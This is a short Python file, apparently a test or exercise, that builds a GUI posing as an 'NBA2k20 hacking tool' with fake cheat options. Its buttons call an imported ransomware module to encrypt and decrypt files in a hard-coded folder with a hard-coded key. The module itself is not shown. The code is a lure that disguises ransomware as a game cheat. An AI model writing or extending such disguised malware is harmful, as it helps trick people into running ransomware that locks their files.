# import the library
from appJar import gui
import ransomware

key = "foopassword"
path = "D:\\test\\"
# handle button events
def press(button):
    if (button == "Encrypt"):
        ransomware.encrypt_files(path, key)
    elif(button == "Decrypt"):
        ransomware.decrypt_files(path, key)

def createGUI():
    # create a GUI variable called app
    app = gui("NBA2k20 hacking tool", "600x700")
    app.setBg("grey")
    app.setFont(18)

    # add image
    app.addImage("thumbnail", "game.png")
    # add & configure widgets - widgets get a name, to help referencing them later
    app.addLabel("title", "NBA2k20 gameplay editor")
    app.setLabelFg("title", "white")

    app.check("max speed")
    app.check("max vertical")
    app.check("unlimited stamina")
    app.check("green shot")
    app.check("100% shot success")

    # link the buttons to the function called press
    app.addButtons(["Encrypt", "Decrypt"], press)


    # start the GUI
    app.go()

#if __name__ == "__main__":
createGUI()
